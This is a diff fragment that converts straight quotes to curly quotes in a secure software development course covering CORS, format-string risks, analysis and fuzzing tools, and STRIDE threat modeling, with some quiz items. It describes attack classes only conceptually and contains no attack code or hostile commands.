+\>\>In an HTML anchor (**&lt;a href=...>**) to another site, if you use **target=...** with a value other than **&#95;self**, be sure to also set “**rel**” to “**noopener noreferrer**” prevent control by that other site of the originating tab. True or False?<<
 
 (x) True
 
@@ -3004,9 +3004,9 @@ And **authority** has this syntax:
 
 Sometimes untrusted users will give you data that you want to use as a URL (or turn into a URL) to request more information. However, this can be dangerous. If you include a URL in data you present to a user, they might do the equivalent of clicking on it. It turns out that URLs are powerful things, and an attacker might try to exploit any of their capabilities. For example:
 
-* A URL need not use the **https:** scheme; it might have other schemes like **file:** (to retrieve a local file) or even relatively obscure schemes like **gopher:**.  One sneaky attack is to request one scheme (like "**gopher:**") to a service that expects a completely different protocol; an attacker may be able to use this confusion to produce an attack.
+* A URL need not use the **https:** scheme; it might have other schemes like **file:** (to retrieve a local file) or even relatively obscure schemes like **gopher:**.  One sneaky attack is to request one scheme (like “**gopher:**”) to a service that expects a completely different protocol; an attacker may be able to use this confusion to produce an attack.
 
-* The "host" might not be what you expect; the host might refer to an arbitrary other computer or even the requesting computer.
+* The “host” might not be what you expect; the host might refer to an arbitrary other computer or even the requesting computer.
 
 * An attacker might provide **userinfo** (a user account name) and/or a port. The port, for example, allows a URL to request a connection on *any* port of a computer.
 
@@ -3058,15 +3058,15 @@ A CORS simple request is used when *all* of the following are true:
 
 * A few other requirements are also met. See the specification for details; in most cases these other requirements will be met.
 
-When a CORS simple request is made, the web browser makes the request as usual and also sets the HTTP header **Origin** to the script origin. The web server then determines if that request is acceptable. The web server then replies and sets the HTTP header **Access-Control-Allow-Origin** with information about the allowed origin(s). If that value is "**&#42;**", then *any* origin is allowed that access. The web browser looks at the **Access-Control-Allow-Origin**, and if the requesting origin matches, the script receives any information returned.
+When a CORS simple request is made, the web browser makes the request as usual and also sets the HTTP header **Origin** to the script origin. The web server then determines if that request is acceptable. The web server then replies and sets the HTTP header **Access-Control-Allow-Origin** with information about the allowed origin(s). If that value is “**&#42;**”, then *any* origin is allowed that access. The web browser looks at the **Access-Control-Allow-Origin**, and if the requesting origin matches, the script receives any information returned.
 
-A preflighted request, unlike a simple request, uses an extra step. In a preflighted request, the web browser first sends an **OPTIONS** request with the **Origin** and other information, to ask the web server if the actual request is "*safe to send*". If the web server approves it, then the actual request is sent. Some browsers do not follow redirects for a preflighted request; see the [Mozilla CORS documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for solutions if it matters to you.
+A preflighted request, unlike a simple request, uses an extra step. In a preflighted request, the web browser first sends an **OPTIONS** request with the **Origin** and other information, to ask the web server if the actual request is “*safe to send*”. If the web server approves it, then the actual request is sent. Some browsers do not follow redirects for a preflighted request; see the [Mozilla CORS documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for solutions if it matters to you.
 
 By default, browsers will not send credentials (cookies and HTTP Authentication information) in a CORS request. However, a specific flag can be set on an  **XMLHttpRequest** object or **Request** constructor to send credentials. If this is done, the web server must return **Access-Control-Allow-Credentials: true** or the JavaScript program will not receive the results. Web servers should be very cautious about using this; if it is used at all, be very picky about the origins allowed. It is much safer to *not* use **Access-Control-Allow-Credentials**, as this allows credentialed programmatic control from a different origin.
 
-If you intend for some information to be publicly readable on your web server, and it never varies (no matter who requested it or where it is from), consider returning "**Access-Control-Allow-Origin: &#42;**" when a web browser tries to **GET** that information. This allows client-side JavaScript programs to directly retrieve that information and use it further. That does allow JavaScript programs to repeatedly request it, so in theory that makes DDoS attacks slightly easier. However, for many websites the goal is to distribute some information, and DDoS can be countered in other ways.
+If you intend for some information to be publicly readable on your web server, and it never varies (no matter who requested it or where it is from), consider returning “**Access-Control-Allow-Origin: &#42;**” when a web browser tries to **GET** that information. This allows client-side JavaScript programs to directly retrieve that information and use it further. That does allow JavaScript programs to repeatedly request it, so in theory that makes DDoS attacks slightly easier. However, for many websites the goal is to distribute some information, and DDoS can be countered in other ways.
 
-Sometimes the information may vary depending on the origin of the requestor (this is true if you set an **Access-Control-Allow-Origin** to any value other than "**&#42;**"). In these cases, ensure that you include a “**Vary**” header with the value “**Origin**”. This “**Vary**” value tells the web browser that the result may vary depending on the origin, preventing information from one origin from leaking into another origin (or lack of origin) via CORS.
+Sometimes the information may vary depending on the origin of the requestor (this is true if you set an **Access-Control-Allow-Origin** to any value other than “**&#42;**”). In these cases, ensure that you include a “**Vary**” header with the value “**Origin**”. This “**Vary**” value tells the web browser that the result may vary depending on the origin, preventing information from one origin from leaking into another origin (or lack of origin) via CORS.
 
 Details on how to enable CORS for a large variety of circumstances is available at [enable-cors.org](https://enable-cors.org/). You can also check out the following resources for more details:
 
@@ -3082,7 +3082,7 @@ Producing results can be complicated. Almost all programming languages have spec
 
 However, *be very careful* about letting untrusted users control the output formats (that is, using format strings and templates from untrusted users). In many cases, you should *not* let untrusted users set output formats that are used by general-purpose templating systems without carefully validating them first. Some output format systems can execute arbitrary code, or reveal information beyond a specific set of approved values - and you *definitely* should not allow that in most cases! Even when they cannot run *arbitrary* code, by definition they control the output, and they may be able to create misleading results or results that overwhelm wherever the output goes.
 
-The C programming language output routines are especially dangerous, because their design assumes that the format string parameters are from trusted sources. For example, the **printf()** family of routines (including **fprintf** and **snprintf**) takes a *format string* parameter; if an attacker can control the format string, then the attacker can trivially make the result arbitrarily long (leading to a buffer overflow), print any memory area (revealing confidential information or data that enables a security bypass), or use the **%n** operation to overwrite arbitrary memory areas. The same is true for **syslog()** (which writes system log information) and **setproctitle()** (which sets the string used to display process identifier information). Many functions with names beginning with "**err**" or “**warn**”, containing “**log**”, or ending in “**printf**” are worth reviewing.
+The C programming language output routines are especially dangerous, because their design assumes that the format string parameters are from trusted sources. For example, the **printf()** family of routines (including **fprintf** and **snprintf**) takes a *format string* parameter; if an attacker can control the format string, then the attacker can trivially make the result arbitrarily long (leading to a buffer overflow), print any memory area (revealing confidential information or data that enables a security bypass), or use the **%n** operation to overwrite arbitrary memory areas. The same is true for **syslog()** (which writes system log information) and **setproctitle()** (which sets the string used to display process identifier information). Many functions with names beginning with “**err**” or “**warn**”, containing “**log**”, or ending in “**printf**” are worth reviewing.
 
 Most other programming languages’ format systems are not quite that dangerous, but they can still cause problems. The best solution is to make sure that an untrusted user cannot provide the format string. If circumstances require that you allow that, *make sure* that the system you use cannot allow a vulnerability, e.g., by only allowing specific kinds of formats (be sure to validate that!), or use a library that is specifically designed to be safely used with untrusted templates. Even in those cases, remember that if a user can control the output template, the user can produce a copious amount of output. Ensure that this is not a serious issue (e.g., by ensuring that only that same user sees the results from that template, so attackers only end up attacking themselves).
 
@@ -3106,7 +3106,7 @@ Avoid giving security or sensitive information to untrusted users. If a request 
 
 * If your program accepts a password, don’t echo the exact characters back; this creates another way passwords can be seen by others. In HTML forms, set the input type to password, which intentionally limits the feedback.
 
-* On a failed login, just say "*username or password failed*" or similar - don’t expose whether it was the username or the password that failed. That could tell the attacker that the username is valid, and makes further attacks easier.
+* On a failed login, just say “*username or password failed*” or similar - don’t expose whether it was the username or the password that failed. That could tell the attacker that the username is valid, and makes further attacks easier.
 
 * In general, don’t display sensitive/private data unless necessary at that point.
 
@@ -3199,7 +3199,7 @@ In security we often want to use tools that find and report certain kinds of vul
   <tr>
     <td><b>Reported</b> (a defect)</td>
     <td><i>True positive (TP)</i>: Correctly reported (a defect)</td>
-    <td><i>False positive (FP)</i>: Incorrect report (of a "defect" that’s not a defect) (“Type I error”)</td>
+    <td><i>False positive (FP)</i>: Incorrect report (of a “defect” that’s not a defect) (“Type I error”)</td>
   </tr>
   <tr>
     <td><b>Did not report</b> (a defect (there))</td>
@@ -3225,7 +3225,7 @@ So let’s look at some kinds of tools you can use to help make your software se
 
 ### Quiz 1.1
 
-\>\>When using tools to look for security vulnerabilities, there is normally a risk of "false negatives" - that is, failing to report vulnerabilities even when they are present and the tool is designed to find that kind of vulnerability. True or False?<<
+\>\>When using tools to look for security vulnerabilities, there is normally a risk of “false negatives” - that is, failing to report vulnerabilities even when they are present and the tool is designed to find that kind of vulnerability. True or False?<<
 
 (x) True
 
@@ -3239,9 +3239,9 @@ Static analysis is any approach for verifying software (including finding defect
 
 #### Human Review
 
-Humans can be amazing at finding defects. This is one of the big potential advantages of open source software (OSS); since anyone can review OSS source code to find defects, there is a potential mass peer review. But humans have their downsides. Human time is expensive, humans get bored, and humans have "off" days where they are less effective (e.g., they might miss things). Different humans have different levels of effectiveness, too. It’s great to have humans review code, but you also want to support humans with tools that will find problems the humans may miss.
+Humans can be amazing at finding defects. This is one of the big potential advantages of open source software (OSS); since anyone can review OSS source code to find defects, there is a potential mass peer review. But humans have their downsides. Human time is expensive, humans get bored, and humans have “off” days where they are less effective (e.g., they might miss things). Different humans have different levels of effectiveness, too. It’s great to have humans review code, but you also want to support humans with tools that will find problems the humans may miss.
 
-If you can get humans to review code, do so! But you may want to direct the humans to examine issues that tools are especially not good at. In particular, it is good to have people review the "entry points" (attack surface) across a trust boundary to ensure that every request is either authorized or rejected. Determining whether or not a request is authorized is not something most tools are good at (they lack the information to make the decision). What is more, if that analysis is too hard for humans, there is something wrong with the software - it should be relatively *easy* to answer that question on each entry point. It is also a common problem; as we noted earlier, *Broken Access Control* is 2017 OWASP Top 10 #2.
+If you can get humans to review code, do so! But you may want to direct the humans to examine issues that tools are especially not good at. In particular, it is good to have people review the “entry points” (attack surface) across a trust boundary to ensure that every request is either authorized or rejected. Determining whether or not a request is authorized is not something most tools are good at (they lack the information to make the decision). What is more, if that analysis is too hard for humans, there is something wrong with the software - it should be relatively *easy* to answer that question on each entry point. It is also a common problem; as we noted earlier, *Broken Access Control* is 2017 OWASP Top 10 #2.
 
 In general, if there are problems that tools are not good at finding, it may be best to modify your design so the problem cannot happen in the first place. For example, choose a memory-safe language or design a system component so only safe requests can be made. If that does not work, it may be wise to try to find or develop a tool to find it. That said, there will always be issues that tools will not work well for. If nothing else works, then work to focus the most powerful tool of all on the problem: people. But people’s time is limited, so where you can, try to not depend *solely* on human review.
 
@@ -3249,7 +3249,7 @@ So with that said, let’s start discussing tools to help us.
 
 #### Generic Bug-Finding Tools: Quality Tools, Compiler Warnings, and Type-Checking Tools
 
-Some tools examine source code, byte code, or machine code to look for generic "quality" problems. For example, they may look for misleading indentation, combinations of constructs that usually indicate a defect, or overly-long methods that may be hard to understand later. There are a large variety of these, including compiler warning flags, style checkers, and so on. The tools themselves are often cheap or free, and they often run quickly, because they typically don’t need to do a deep analysis.
+Some tools examine source code, byte code, or machine code to look for generic “quality” problems. For example, they may look for misleading indentation, combinations of constructs that usually indicate a defect, or overly-long methods that may be hard to understand later. There are a large variety of these, including compiler warning flags, style checkers, and so on. The tools themselves are often cheap or free, and they often run quickly, because they typically don’t need to do a deep analysis.
 
 These tools often don’t focus on security, but using them can still help improve security:
 
@@ -3273,7 +3273,7 @@ The patterns are generally heuristic, and different tools generally look for dif
 
 If your primary goal is to find as many vulnerabilities as possible, it is best to use multiple tools, even multiple tools of the same kind, so that a vulnerability not detected by one tool might be detected by another. Unfortunately, using multiple tools can get expensive in money and effort. Some tools are expensive, and no matter what, it takes time to configure the tool for its particular use and to analyze its reports. As often happens, there is a trade-off; the set of tools you select will be strongly influenced by the resources available, as well as the expected likelihood and impact of unfound vulnerabilities.
 
-Of course, not everything reported by any of these tools is an *actual* vulnerability. All of these tools have some risk of generating a false positive. For example, a tool might detect a vulnerability triggered by some input, but you may know that only a trusted user can control that input… so while the tool is correct in one sense, it is not actually a vulnerability. In many cases, it is best to fix the report anyway; people are often wrong when they say something "can’t" happen, and the software or its environment may change in the future (so fixing it will future-proof the software). If you are confident the report is a false positive, and “fixing” the code to eliminate the report is not worth the trouble, most such tools have a way to disable the report (e.g., via a comment in the source code). That way, the tool will stop reporting about it; otherwise the tool reports will over time only have a large set of false positives. Just make sure that you only disable a report if you are *certain* it is a false positive.
+Of course, not everything reported by any of these tools is an *actual* vulnerability. All of these tools have some risk of generating a false positive. For example, a tool might detect a vulnerability triggered by some input, but you may know that only a trusted user can control that input… so while the tool is correct in one sense, it is not actually a vulnerability. In many cases, it is best to fix the report anyway; people are often wrong when they say something “can’t” happen, and the software or its environment may change in the future (so fixing it will future-proof the software). If you are confident the report is a false positive, and “fixing” the code to eliminate the report is not worth the trouble, most such tools have a way to disable the report (e.g., via a comment in the source code). That way, the tool will stop reporting about it; otherwise the tool reports will over time only have a large set of false positives. Just make sure that you only disable a report if you are *certain* it is a false positive.
 
 #### Specialized Security Code Scanners/SAST Tools
 
@@ -3281,7 +3281,7 @@ Some tools are designed to only look for one or a very few specific kinds of vul
 
 Here are some kinds of vulnerabilities that specialized SAST tools can detect:
 
-* Regular Expression Denial-of-Service (ReDoS) vulnerabilities (that is, regular expressions with terrible worst-case performance). You can look for terms like "ReDoS", “evil regex”, and “safe regex”. These extract the regular expressions from source code, and then analyze the regular expressions.
+* Regular Expression Denial-of-Service (ReDoS) vulnerabilities (that is, regular expressions with terrible worst-case performance). You can look for terms like “ReDoS”, “evil regex”, and “safe regex”. These extract the regular expressions from source code, and then analyze the regular expressions.
 
 * Hardcoded credentials such as cryptographic keys and passwords.
 
@@ -3333,7 +3333,7 @@ You should avoid some bad behavior to make these tools more useful. Some develop
 
 It is far better to apply some good practices. First, when reusing software, use a package manager to manage it, one that records the specific version numbers in a standard format that you can record in your version control system. By using a standard format, you can use far simpler SCA tools, and the data will be more accurate. By using a package manager you can trivially cause a software update and check that the new set of components works.
 
-But who decides how fast you need to update your reused components? That is a tricky question. Some people may say, "my company policy", “my chief information security officer” (CISO), “my chief information office” (CIO), or something like that. All of those answers are wrong answers. If your goal is to have a secure system, then the correct answer is that the **_attackers_** *decide when you need to update*! That’s because you need to get the updated version deployed before an attacker exploits that vulnerability in your deployed system.
+But who decides how fast you need to update your reused components? That is a tricky question. Some people may say, “my company policy”, “my chief information security officer” (CISO), “my chief information office” (CIO), or something like that. All of those answers are wrong answers. If your goal is to have a secure system, then the correct answer is that the **_attackers_** *decide when you need to update*! That’s because you need to get the updated version deployed before an attacker exploits that vulnerability in your deployed system.
 
 Speed is important when a component you depend on has a publicly-known vulnerability, and you *know* that this will happen sometimes. So trying to handle this completely manually is a mistake. You should instead make sure that:
 
@@ -3379,25 +3379,25 @@ All dynamic analysis tools have a fundamental limitation: it is impossible to ev
 
 Let’s imagine a trivial program that adds two 64-bit integers. The number of possible inputs is (2^64)\*(2^64) = 2^128. If we ran tests with a 4GHZ processor, and could run and test each input in 5 cycles, it would take 13.5 x 10^21 years (13.5 zetta years) to fully test the program. Using 1 million 8-core processors does not help enough; that would reduce the time to 1.7 x 10^15 years (that is, 1.7 quadrillion years). Real programs have far more complex inputs than this, so testing even 0.00001% of all inputs of real programs is impossible in human lifetimes.
 
-As a result, all dynamic analysis approaches must try to select a very small subset of possible inputs that still have a chance of detecting problems where they exist. They are often very effective. But dynamic analysis approaches cannot "prove" that anything works correctly in general; at best, they have a good chance of detecting problems.
+As a result, all dynamic analysis approaches must try to select a very small subset of possible inputs that still have a chance of detecting problems where they exist. They are often very effective. But dynamic analysis approaches cannot “prove” that anything works correctly in general; at best, they have a good chance of detecting problems.
 
 #### Traditional Testing
 
 The best-known dynamic analysis approach is traditional testing. You select specific inputs to send to a program, and check to see if the result is correct. You can test specific parts of a program, such as a method or function (this is called *unit testing*). You can also send sequences of inputs to the system integrated as a whole (*integration testing*). Most people combine unit and integration testing. Unit testing is fast and it can be easy to test many special cases, but unit testing often misses whole-system problems that integration testing is much more likely to detect. Since computers are much faster than they were decades ago, it is often best to focus on integration testing over unit testing, but both approaches have their place. The testing literature describes other kinds of testing, but for our purposes, these two approaches are enough to understand the issues.
 
-If your software needs to work correctly, it is critically important that you have a good test suite of *automated* tests and apply that test suite in your continuous integration pipeline. By *good* we mean "relatively likely to detect serious problems in the software". While this does not guarantee there are no errors, a good test suite greatly increases the probability of detection, and is especially important for detecting problems when you upgrade a reused component.
+If your software needs to work correctly, it is critically important that you have a good test suite of *automated* tests and apply that test suite in your continuous integration pipeline. By *good* we mean “relatively likely to detect serious problems in the software”. While this does not guarantee there are no errors, a good test suite greatly increases the probability of detection, and is especially important for detecting problems when you upgrade a reused component.
 
 If you deliver software, and a defect is later found and fixed, for each fix you should think about adding another test for that situation. Often, defects that escape to the field indicate a kind of subtle mistake that might reoccur in a future version of the system. In that case, add test(s) so if that problem recurs, will be detected *before* releasing another version.
 
 If you are contracting someone else to write (some of) your software, and you don’t want to be controlled by them later, you need to make sure that you not only get the application source code (and the rights to modify it further), but also get all the build instructions and tests necessary to be able to confidently change the software. After all, if you cannot easily build or test a software modification, there is no safe way to make modifications and ship it.
 
-In theory, you can create manual tests, that is, write a detailed step-by-step manual procedure and have a human follow those test steps. In practice, manual tests are almost always "tests that won’t be done" because of their high costs and delay. Another problem with manual testing is that it *discourages* continuous testing, since it costs time and money to do those manual tests. So avoid manual testing in favor of automated testing where practical. In some cases you may need to do manual testing, but remember that every manual test is a test that will rarely (if ever) be done, making that test far less useful. Note that what we are describing as *manual tests* are different from *undirected manual analysis* (where humans use the software *without* a step-by-step process). Undirected manual analysis can be quite effective, but is completely different from manual tests as we have defined them here.
+In theory, you can create manual tests, that is, write a detailed step-by-step manual procedure and have a human follow those test steps. In practice, manual tests are almost always “tests that won’t be done” because of their high costs and delay. Another problem with manual testing is that it *discourages* continuous testing, since it costs time and money to do those manual tests. So avoid manual testing in favor of automated testing where practical. In some cases you may need to do manual testing, but remember that every manual test is a test that will rarely (if ever) be done, making that test far less useful. Note that what we are describing as *manual tests* are different from *undirected manual analysis* (where humans use the software *without* a step-by-step process). Undirected manual analysis can be quite effective, but is completely different from manual tests as we have defined them here.
 
 A tricky problem in testing is when a resource is not available. If the test requires some software, hardware, or data that you don’t have, you cannot directly test it. Typically, the best you can do in those cases is simulate it (e.g., with mocked software, simulated hardware, or a stand-in dataset). If that is the best you can do, it is usually worthwhile. But don’t confuse the simulation with reality; the test results may be misleading due to differences between the actual resource and its stand-in.
 
 #### Traditional Testing for Security
 
-From a security perspective, it is important to include tests for security requirements. In particular, test both "what should happen" and “what should not happen”. Often people forget to test *what should not happen* (aka negative testing). For example, where it applies, you should have a test to check “Can I read/write *without* being authorized to do so?” (the answer should be “no”) and “Can I access the system with an *invalid* certificate or no certificate at all?” (again, that should fail). It is very common for programs’ security to fail because they don’t properly check for authentication (2017 OWASP Top 10 #2) or authorization (2017 OWASP Top 10 #5), so make sure you have tests for that!
+From a security perspective, it is important to include tests for security requirements. In particular, test both “what should happen” and “what should not happen”. Often people forget to test *what should not happen* (aka negative testing). For example, where it applies, you should have a test to check “Can I read/write *without* being authorized to do so?” (the answer should be “no”) and “Can I access the system with an *invalid* certificate or no certificate at all?” (again, that should fail). It is very common for programs’ security to fail because they don’t properly check for authentication (2017 OWASP Top 10 #2) or authorization (2017 OWASP Top 10 #5), so make sure you have tests for that!
 
 One approach to developing software is called t*est-driven development* (TDD). To over-summarize, in TDD the tests for a new capability are written before the software to implement the capability. This has some advantages, in particular, it encourages writing useful tests that actually check what they are supposed to check, and it also encourages developing testable software. One potential problem with TDD is that many TDD practitioners fail to write *negative* tests. Some TDD guidance even argues that you should only write tests for the new capability and nothing else. This is terrible guidance, because sometimes some things should simply *never* be allowed to happen, and you still need to test for them. You can definitely write secure software using TDD, but you must include negative tests (tests for what the software must *not* do) if you apply TDD.
 
@@ -3413,13 +3413,13 @@ Two simple measurements that can help you answer this question are *statement co
 
 Statement coverage and branch coverage combine dynamic analysis (test results) with static analysis (information about the code), so it is sometimes considered a *hybrid* approach. But no matter what you call it, these measurements do provide some information about how well a program is tested.
 
-One potential problem with statement coverage and branch coverage is that some statements and branches may be unreachable for a variety of reasons. If a statement cannot be reached, you may want to insert the equivalent of "**assert(false)**" to inform tools and humans that this statement should never be reached. What you really want to know is the percent of *possible* branches and statements that were covered by tests.
+One potential problem with statement coverage and branch coverage is that some statements and branches may be unreachable for a variety of reasons. If a statement cannot be reached, you may want to insert the equivalent of “**assert(false)**” to inform tools and humans that this statement should never be reached. What you really want to know is the percent of *possible* branches and statements that were covered by tests.
 
 As a rule of thumb, we believe that an automated test suite with less than 90% statement coverage or less than 80% branch coverage (over all automated tests) is a poor test suite. But this is merely a rule of thumb. Some experts think that larger numbers should be expected (some argue anything less than 100% of possible statements and branches is unacceptable). All other things being equal, larger numbers are good, but it is often much costlier to get those last few percent, and whether or not it is worth it depends on how important the software is. In many cases some statements or branches cannot be executed, and there may not be a way to indicate that to the measurement tools.
 
 These test coverage measures warn you about statements and branches that are not being tested, and that information can be really valuable. From a security standpoint, coverage measures warn you about statements or branches that are not being run in tests, which suggests that either there are some important tests missing or the software is not working properly. Don’t just add a test; make sure you understand *why* something is not being covered.
 
-For example, we earlier mentioned a dangerous vulnerability in many versions of Apple’s operating systems, formally named CVE-2014-1266 and informally called the "goto fail; goto fail;" vulnerability. The problem was that due to a duplicated **goto** statement, some code vital for checking security certificates was skipped. A statement coverage measure would have trivially detected that this security-critical code was not being run by any test, and that should have been enough warning to look into the problem.
+For example, we earlier mentioned a dangerous vulnerability in many versions of Apple’s operating systems, formally named CVE-2014-1266 and informally called the “goto fail; goto fail;” vulnerability. The problem was that due to a duplicated **goto** statement, some code vital for checking security certificates was skipped. A statement coverage measure would have trivially detected that this security-critical code was not being run by any test, and that should have been enough warning to look into the problem.
 
 A big problem with statement and branch coverage measures is that they can warn you about some bad automated test suites, but a bad test suite could still get 100% perfect scores. For example, a test suite might exercise all the branches and statements but not check if any of the answers were correct. That test suite would have 100% branch and statement coverage, and would also be a bad test suite. In addition, while they can tell you about whether or not existing code was tested, they cannot detect *missing* code. For example, if there is a special case that needs special handling, but nothing checks for that special case, typically these coverage measures cannot detect that.
 
@@ -3431,13 +3431,13 @@ But there is more to dynamic analysis when you are interested in security. Let�
 
 \>\>Select the true statement(s) about dynamic analysis including testing:<<
 
-[!] For high-quality software, ensure that the software is tested with all possible input values. {{ selected: That is completely impossible. We cannot even do that for software that just adds two 64-bit numbers, nevermind "real world" software. }}
+[!] For high-quality software, ensure that the software is tested with all possible input values. {{ selected: That is completely impossible. We cannot even do that for software that just adds two 64-bit numbers, nevermind “real world” software. }}
 
 [x] Unit testing often misses whole-system problems that integration testing is much more likely to detect.
 
 [ ] Statement coverage measures the percentage of branches executed by some set of tests. {{ selected: No. Branch coverage measures branches, statement coverages measures statements. }}
 
-[ ] Every security test should ensure that the system performs an action when it has already been authorized to do so. {{ selected: No, though this is an admittedly sneaky question. It is probably more important for security to write tests to check that the system does NOT perform various actions when it is NOT authorized to do so. These kinds of tests, to ensure that something is NOT done when it’s not supposed to be done, are sometimes called "negative testing". It is very important, for security, that these negative tests are part of your automated test suite. }}
+[ ] Every security test should ensure that the system performs an action when it has already been authorized to do so. {{ selected: No, though this is an admittedly sneaky question. It is probably more important for security to write tests to check that the system does NOT perform various actions when it is NOT authorized to do so. These kinds of tests, to ensure that something is NOT done when it’s not supposed to be done, are sometimes called “negative testing”. It is very important, for security, that these negative tests are part of your automated test suite. }}
 
 [x] If statements are not being exercised by your test suite, you should investigate to determine why, especially if they are important to security.
 
@@ -3449,7 +3449,7 @@ Fuzz testing is a different kind of dynamic analysis.
 
 #### Fuzzing vs. Traditional Testing
 
-In fuzz testing, you generate a large number of *random* inputs, run the program, and see if the program behaves badly (e.g., crashes or hangs). A key aspect of fuzzing is that it does *not* generally check if the program produces the correct answer; it just checks that certain reasonable behavior (like "does not crash") occurs.
+In fuzz testing, you generate a large number of *random* inputs, run the program, and see if the program behaves badly (e.g., crashes or hangs). A key aspect of fuzzing is that it does *not* generally check if the program produces the correct answer; it just checks that certain reasonable behavior (like “does not crash”) occurs.
 
 It’s often a lot of work to create traditional tests, in part because you have to know what the correct result will be. Fuzzing gives that up, making it easier to send more inputs automatically to a program but giving up the ability to detect certain kinds of errors. As computers have gotten faster and cheaper, fuzzing has become very useful, because it is possible to run many computers for a long period of time to try out many inputs. Fuzzing can be particularly effective at detecting memory safety errors (which are both common and dangerous) and at creating odd inputs that stress the input validators. Fuzzing does not replace traditional testing, but it can be an excellent complement to traditional testing.
 
@@ -3463,7 +3463,7 @@ Both the Firefox and Chromium web browsers use fuzzers, combined with ASAN, to t
 
 If your program performs checks on input like examining checksums or CRC (Cyclic Redundancy Check) headers, you will probably soon need to disable those checks or specially re-implement those values when using a fuzzer. By all means use the fuzzer on the program unmodified first, but the problem is that the fuzzer will end up primarily testing the checksum/CRC header checking code again and again, not the rest of the code. Some fuzzers are tailored to create well-formatted inputs that will pass checks such as CRC and then attempt to find errors deeper in the program under test.
 
-Many fuzzers are *mutation-based* - that is, they begin with a starting set of sample inputs (called "seeds"), and then repeatedly mutate previous inputs to create new test inputs. The effectiveness of mutation-based fuzzers greatly depends on the seeds chosen. A useful rule-of-thumb for creating seeds is to try to select a minimum set of inputs necessary to cover (or almost cover) the code (that is, to achieve 100% statement coverage). To learn more, see [*Optimizing Seed Selection for Fuzzing*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf), 2014. If that is too many seeds, select seeds to cover as much of the code as possible with that number of seeds (so each seed will be significantly different).
+Many fuzzers are *mutation-based* - that is, they begin with a starting set of sample inputs (called “seeds”), and then repeatedly mutate previous inputs to create new test inputs. The effectiveness of mutation-based fuzzers greatly depends on the seeds chosen. A useful rule-of-thumb for creating seeds is to try to select a minimum set of inputs necessary to cover (or almost cover) the code (that is, to achieve 100% statement coverage). To learn more, see [*Optimizing Seed Selection for Fuzzing*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf), 2014. If that is too many seeds, select seeds to cover as much of the code as possible with that number of seeds (so each seed will be significantly different).
 
 #### Coverage-Guided Fuzzers
 
@@ -3519,7 +3519,7 @@ The term Dynamic Application Security Testing, or DAST, is often seen in literat
 
 * For some, DAST is dynamic analysis for finding vulnerabilities in web applications (see VeraCode, [*DAST TEST: Benefits of a DAST test for application security*](https://www.veracode.com/security/dast-test), 2020), making the term mostly equivalent to *web application scanners*. John Breeden II ([*9 top fuzzing tools: Finding the weirdest application errors*](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html), 2019) states this and expressly differentiates DAST from fuzzing.
 
-* Thomas Scanlon ([*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html), 2018) defines DAST as tools for finding security vulnerabilities where *"the tester has no prior knowledge of the system"* and that *“DAST tools employ fuzzing”*. With this definition, web application scanners and fuzzers are DAST tools. Similarly, Sergej Dechand ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), 2020) includes web application scanners and fuzzers under “DAST”.
+* Thomas Scanlon ([*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html), 2018) defines DAST as tools for finding security vulnerabilities where *“the tester has no prior knowledge of the system”* and that *“DAST tools employ fuzzing”*. With this definition, web application scanners and fuzzers are DAST tools. Similarly, Sergej Dechand ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), 2020) includes web application scanners and fuzzers under “DAST”.
 
 In this course we have intentionally used more specific terms instead of DAST, in the hopes of making things clearer. The point, regardless of the terminology, is to use approaches (including tools) to find and fix vulnerabilities before the attackers exploit them.
 
@@ -3543,11 +3543,11 @@ A *security audit* reviews a system to look for vulnerabilities. Often the phras
 
 The Core Infrastructure Initiative (CII) Best Practices badge identifies a set of best practices for open source software (OSS) projects. There are three badge levels: passing, silver, and gold. Each level requires meeting the previous level; gold is especially difficult and *requires* multiple developers. Within each level are a set of criteria that are considered best practices for developing secure and sustainable OSS, and each criterion has a short identifier. Here are some examples of its criteria:
 
-* "*The project MUST **use at least one automated test suite that is publicly released as FLOSS** (this test suite may be maintained as a separate FLOSS project)."* [test] Note that this criterion is solely about a traditional automated test suite (e.g., for its functionality).
+* “*The project MUST **use at least one automated test suite that is publicly released as FLOSS** (this test suite may be maintained as a separate FLOSS project).”* [test] Note that this criterion is solely about a traditional automated test suite (e.g., for its functionality).
 
-* *"At least one static code analysis tool MUST be applied to any proposed major production release of the software before its release, if there is at least one FLOSS tool that implements this criterion in the selected language."* [static_analysis]
+* *“At least one static code analysis tool MUST be applied to any proposed major production release of the software before its release, if there is at least one FLOSS tool that implements this criterion in the selected language.”* [static_analysis]
 
-* *"The project sites (website, repository, and download URLs) MUST support HTTPS using TLS."* [sites_https]
+* *“The project sites (website, repository, and download URLs) MUST support HTTPS using TLS.”* [sites_https]
 
 If you are using OSS, consider preferring OSS who have earned a badge. If you are developing OSS, you should strongly consider working to earn a Core Infrastructure Initiative (CII) Best Practices badge. By implementing these best practices you will increase the likelihood of developing higher-quality and more secure software. To learn more and get started, check out the [CII Best Practices Badge Program](https://bestpractices.coreinfrastructure.org/en).
 
@@ -3639,11 +3639,11 @@ Elements are everything except the trust boundaries. That is, processes, data st
 
 The idea is to have a simple model of the design that shows the essential features. Here are some quick rules of thumb for a good representation:
 
-* Every data store should have at least one input and at least one output ("no data coming out of thin air").
+* Every data store should have at least one input and at least one output (“no data coming out of thin air”).
 
-* Only processes read or write data in data stores ("no psychokinesis")
+* Only processes read or write data in data stores (“no psychokinesis”)
 
-* Similar elements in a single trust boundary can be collapsed into one element ("make the model simple").
+* Similar elements in a single trust boundary can be collapsed into one element (“make the model simple”).
 
 Then, when applying STRIDE in step 3, you examine each of the elements (processes, data stores, data flows, and interactors) to determine what threats it is susceptible to. For each element, you look for the threats as shown in this table:
 
@@ -3651,7 +3651,7 @@ Then, when applying STRIDE in step 3, you examine each of the elements (processe
 
